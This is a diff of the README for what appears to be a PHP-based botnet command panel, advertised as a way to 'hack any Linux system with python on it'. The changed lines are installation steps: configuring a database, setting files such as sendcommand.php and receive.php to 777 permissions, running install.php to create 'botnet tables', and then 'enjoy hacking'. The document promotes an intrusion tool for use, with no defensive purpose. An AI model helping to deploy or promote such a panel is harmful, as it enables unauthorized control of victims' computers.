@@ -34,11 +34,10 @@ You Can use it to hack any Linux system with python on it
 3. Extract it
 4. Go to PHPMyAdmin
 5. Create a database with any name you want
-6. Change the data in config.php
+6. Change the data in classes/database.php
 7. Change files and folders permission to 777 [connection.php,sendcommand.php,receive.php,Clients Folder]
-8. Go to db.php to create the botnet tables automatically
-9. Go to register.php then create a new account
-10. Enter you network and enjoy hacking
+8. Go to install.php to create the botnet tables automatically
+9. Enter you network and enjoy hacking
 
 ## Screenshot
 ![Image of the interface](https://c.top4top.net/p_110481bbz1.png)
@@ -56,7 +55,7 @@ You Can use it to hack any Linux system with python on it
 ## YouTube - How To Install
 [https://youtu.be/GyPdu20rC1A](url)
 
-## Coming Soon
+## What's New
 
 ```
 
